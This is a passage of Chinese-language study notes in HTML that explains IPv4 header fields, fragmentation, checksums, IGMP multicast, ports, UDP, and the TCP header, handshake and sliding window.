title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote><h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="./网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="./网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="./网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="./网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="./网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="./网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="./网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="./网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="./网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="./网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="./网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="./网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="./网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="./网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li> 与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li> 目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li> MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li> 连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="./网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="./网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="./网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="./网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="./网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="./网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" 